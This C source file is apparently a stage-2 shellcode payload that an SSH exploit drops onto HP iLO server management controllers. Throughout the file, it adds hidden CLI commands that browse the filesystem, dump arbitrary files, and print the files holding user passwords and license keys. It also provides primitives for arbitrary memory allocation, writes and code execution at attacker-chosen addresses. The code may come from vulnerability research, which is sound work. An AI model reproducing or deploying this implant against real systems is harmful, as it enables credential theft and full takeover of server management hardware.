/**
 * Stage 2 payload for SSH exploit
 *
 * The documentation is available as "Please help" on iLO SSH interface, once
 * exploit_ssh.py has dropped this stage 2 on iLO.
 */
#include "hp_ilo.h"

/**
 * Define the entrypoint in a dedicated section that is placed at the beggining
 * of the generated shellcode.
 */
__asm__ (
"    .section .entry, \"ax\", %progbits\n"
"    .arm\n"
"    .globl _entrypoint\n"
"    .hidden _entrypoint\n"
"    .type _entrypoint, %function\n"
"_entrypoint:\n"
"    b payload_start\n"
);

void *memcpy(void *dest, const void *src, size_t n)
{
    u8 *d = (u8 *)dest;
    const u8 *s = (const u8 *)src;
    size_t i;

    for (i = 0; i < n; i++) {
        d[i] = s[i];
    }
    return dest;
}

static bool strequals(const char *s1, const char *s2)
{
    if (!s1 || !s2)
        return s1 == s2;
    while (*s1 && *s1 == *s2) {
        s1 += 1;
        s2 += 1;
    }
    return *s1 == *s2;
}

/**
 * Hexdump data, with ASCII characters
 */
static void hexdump(u32 cli_id, const void *pMem, size_t size, u32 baseaddr)
{
    u32 iline, i;
    bool last_was_fullzero = false;
    for (iline = 0; iline < size; iline += 16) {
        bool is_fullzero = true;
        const u8 *pMemLine = ((const u8 *)pMem) + iline;
        for (i = 0; i < 16 && iline + i < size; i++) {
            if (pMemLine[i]) {
                is_fullzero = false;
                break;
            }
        }
        if (is_fullzero) {
            if (!last_was_fullzero) {
                CLI_printf(cli_id, "  %06x:", baseaddr + iline);
                CLI_printf(cli_id, " *\r\n");
                last_was_fullzero = true;
            }
            continue;
        }
        last_was_fullzero = false;
        CLI_printf(cli_id, "  %06x:", baseaddr + iline);
        for (i = 0; i < 16; i++) {
            if (!(i % 2))
                CLI_printf(cli_id, " ");
            if (iline + i < size)
                CLI_printf(cli_id, "%02x", pMemLine[i]);
            else
                CLI_printf(cli_id, "  ");
        }
        CLI_printf(cli_id, "  ");
        for (i = 0; i < 16 && iline + i < size; i++) {
            u8 c = pMemLine[i];
            CLI_printf(cli_id, "%c", (32 <= c && c < 127) ? c : '.');
        }
        CLI_printf(cli_id, "\r\n");
    }
}

/**
 * Raw hexdump, parsable by the client
 */
static void raw_hexdump(u32 cli_id, const void *pmem, size_t size, u64 baseaddr)
{
    u32 iline, i;
    for (iline = 0; iline < size; iline += 32) {
        CLI_printf(cli_id, "%Lx:", baseaddr + iline);
        for (i = 0; i < 32 && i + iline < size; i++) {
            CLI_printf(cli_id, "%02x", ((const u8 *)pmem)[iline + i]);
        }
        CLI_printf(cli_id, "\r\n");
    }
}

static bool parse_hex64(const char *string, u64 *pval)
{
    u64 val = 0;
    char c;

    while ((c = *(string++))) {
        /* Ignore x from 0x... prefix */
        if (c == 'x' || c == 'X')
            continue;
        else if ('0' <= c && c <= '9')
            val = (val << 4) + (c - '0');
        else if ('A' <= c && c <= 'F')
            val = (val << 4) + (c - ('A' - 10));
        else if ('a' <= c && c <= 'f')
            val = (val << 4) + (c - ('a' - 10));
        else
            return false;
    }
    *pval = val;
    return true;
}

static bool decode_hexstring(const char *string, u8 *buffer, size_t bufsize)
{
    bool is_first = true;
    u8 val = 0;
    char c;

    while ((c = *(string++))) {
        /* Ignore x from 0x... prefix */
        if (c == 'x' || c == 'X')
            continue;
        else if ('0' <= c && c <= '9')
            val = (val << 4) + (c - '0');
        else if ('A' <= c && c <= 'F')
            val = (val << 4) + (c - ('A' - 10));
        else if ('a' <= c && c <= 'f')
            val = (val << 4) + (c - ('a' - 10));
        else
            return false;

        if (is_first) {
            is_first = false;
        } else if (bufsize >= 1) {
            *(buffer++) = val;
            bufsize -= 1;
            val = 0;
            is_first = true;
        } else {
            return false;
        }
    }
    if (bufsize)
        return false;
    return true;
}

static bool decode_ascii16_int(uint32_t cli_id, const char *value, uint32_t *output) {
    uint32_t result = 0, i;

    for (i = 0; value[i]; i++) {
        if (i > 8) {
            CLI_printf(cli_id, "ASCII-16 value too long\r\n");
            return false;
        }
        if (value[i] < 'A' || value[i] > 'P')
            return false;
        result = (result * 16) + (value[i] - 'A');
    }
    *output = result;
    return true;
}

/* Show the content of a directory */
static void show_dir(u32 cli_id, const char *path)
{
    DIR *d = opendir(path);
    unsigned int i;
    struct dirent ent, *pent = 0;

    if (!d) {
        CLI_printf(cli_id, "opendir(%s) failed: %d\r\n", path, errno);
        return;
    }
    while (readdir_r(d, &ent, &pent) == 0 && pent) {
        /* // Analyze the content of a "struct dirent" entry
        for (i = 0; i < 20 && i < sizeof(ent); i++)
            CLI_printf(cli_id, " %02x", ((u8 *)pent)[i]);
        CLI_printf(cli_id, " = 0x%08x %d (%#x ?) [%d] %s\r\n",
                   pent->d_ino, pent->d_type, pent->d_reclen, pent->d_namelen, pent->d_name);
        */
        CLI_printf(cli_id, "[ino=0x%08x type=%d] %.*s\r\n",
                   (u32)pent->d_ino, pent->d_type, pent->d_namelen, pent->d_name);
    }
    closedir(d);
}

static void show_dir_with_print(u32 cli_id, const char *path)
{
    CLI_printf(cli_id, "%s :\r\n", path);
    show_dir(cli_id, path);
}

static void show_file_hexdump(u32 cli_id, const char *path)
{
    ssize_t bytes_read;
    u8 buffer[16];
    ssize_t i;
    int fd;

    fd = open(path, 0, 0);
    if (fd < 0) {
        CLI_printf(cli_id, "open(%s) failed: %d\r\n", path, errno);
        return;
    }

    CLI_printf(cli_id, "open(%s) = %d\r\n", path, fd);
    do {
        bytes_read = read(fd, buffer, sizeof(buffer));
        for (i = 0; i < bytes_read; i++) {
            CLI_printf(cli_id, " %02x", buffer[i]);
        }
        CLI_printf(cli_id, "  ");
        for (i = 0; i < bytes_read; i++) {
            u8 c = buffer[i];
            CLI_printf(cli_id, "%c", (32 <= c && c < 127) ? c : '.');
        }
        CLI_printf(cli_id, "\r\n");
    } while (bytes_read == sizeof(buffer));
    close(fd);
}

static void run_shell(u32 cli_id, const char *cmd)
{
    FILE *fp;
    char path[1035];

    /* Open the command for reading. */
    fp = popen("/bin/ls /etc/", "r");
    if (fp == NULL) {
        CLI_printf(cli_id, "Failed to run command\n" );
        return;
    }

    /* Read the output a line at a time - output it. */
    while (fgets(path, sizeof(path)-1, fp) != NULL) {
        CLI_printf(cli_id, "%s", path);
    }

    /* close */
    pclose(fp);

    return;
}

/**
 * Return the Log2 of an integer
 */
static u32 custom_log2(u32 n)
{
    u32 res = 0;
    while (n >> 1) {
        res += 1;
        n >>= 1;
    }
    return res;
}


static __attribute__((used))
void payload_start(u32 cli_id)
{
    struct CLI_SESSION *pCli;
    const char *subcommand;
    uint32_t stage1_first_arg = 0;
    unsigned int i;

    pCli = ConAppCLI_get_CLI_session_ptr(cli_id);
    subcommand = pCli->argv[1];

    if (strequals(subcommand, "ls")) { /* List the content of a directory */
        if (!pCli->argv[2][0]) {
            /* No argument => show roots */
            show_dir_with_print(cli_id, "/");
            show_dir_with_print(cli_id, "i:/vol0"); /* i:/vol0 is different from /i:/vol0 ! */
        } else {
            show_dir_with_print(cli_id, pCli->argv[2]);
        }
        return;
    } else if (strequals(subcommand, "hexdump")) { /* Show the content of a file */
        show_file_hexdump(cli_id, pCli->argv[2]);
        return;
    } else if (strequals(subcommand, "showusers")) {
        show_file_hexdump(cli_id, "i:/vol0/cfg/cfg_users.bin");
        return;
    } else if (strequals(subcommand, "showlicense")) {
        show_file_hexdump(cli_id, "i:/vol0/cfg/license.bin");
        return;
    } else if (strequals(subcommand, "help")) {
        CLI_printf(cli_id, "Usage: %s COMMAND [PARAMETERS]\r\n", pCli->argv[0]);
        CLI_printf(cli_id, "Commands:\r\n");
        CLI_printf(cli_id, "  ls [PATH]: list the content of a directory on iLO filesystem\r\n");
        CLI_printf(cli_id, "  hexdump PATH: show the content of a file on iLO filesystem\r\n");
        CLI_printf(cli_id, "  showusers: show the content of the file containing user configuration and passwords\r\n");
        CLI_printf(cli_id, "  showlicense: show the content of the file containing the license keys\r\n");
        return;
    }

    /* stage1 commands */
    if (subcommand[0] == 'a' && decode_ascii16_int(cli_id, subcommand + 1, &stage1_first_arg)) {
        CLI_printf(cli_id, "alloc %#x\r\n", (u32)malloc(stage1_first_arg));
        return;
    }
    if (subcommand[0] == 'f' && decode_ascii16_int(cli_id, subcommand + 1, &stage1_first_arg)) {
        CLI_printf(cli_id, "free %#x\r\n", (u32)stage1_first_arg);
        free((void *)stage1_first_arg);
        return;
    }
    if (subcommand[0] == 'w' && decode_ascii16_int(cli_id, subcommand + 1, &stage1_first_arg)) {
        uint8_t cur_byte;
        char cur_char;

        for (i = 0; pCli->argv[2][i] && pCli->argv[2][i + 1]; i += 2) {
            cur_char = pCli->argv[2][i];
            if (cur_char < 'A' || cur_char > 'P')
                return;
            cur_byte = (cur_char - 'A') * 16;
            cur_char = pCli->argv[2][i + 1];
            if (cur_char < 'A' || cur_char > 'P')
                return;
            cur_byte += (cur_char - 'A');
            CLI_printf(cli_id, "%#x <- %#x\r\n", (u32)stage1_first_arg, cur_byte);
            *(uint8_t *)stage1_first_arg = cur_byte;
            stage1_first_arg += 1;
        }
        return;
    }
    if (subcommand[0] == 'x' && decode_ascii16_int(cli_id, subcommand + 1, &stage1_first_arg)) {
        void (*executed_addr)(uint32_t, struct CLI_SESSION *) = (void *)stage1_first_arg;
        executed_addr(cli_id, pCli);
        return;
    }
    if (subcommand[0] == '?' && decode_ascii16_int(cli_id, subcommand + 1, &stage1_first_arg)) {
        CLI_printf(cli_id, "arg[1]=%.256s, r8=%#x\r\n", subcommand, (u32)stage1_first_arg);
        return;
    }

    CLI_printf(cli_id, "Hi, your command has not been recognized (CLI %#x, argc=%d):\r\n", (u32)pCli, pCli->argc);
    for (i = 0; i < pCli->argc; i++) {
        CLI_printf(cli_id, "  argv[%u] = %.256s\r\n", i, pCli->argv[i]);
    }
    CLI_printf(cli_id, "Use \"%s help\" in order to get usage information.\r\n", pCli->argv[0]);
}
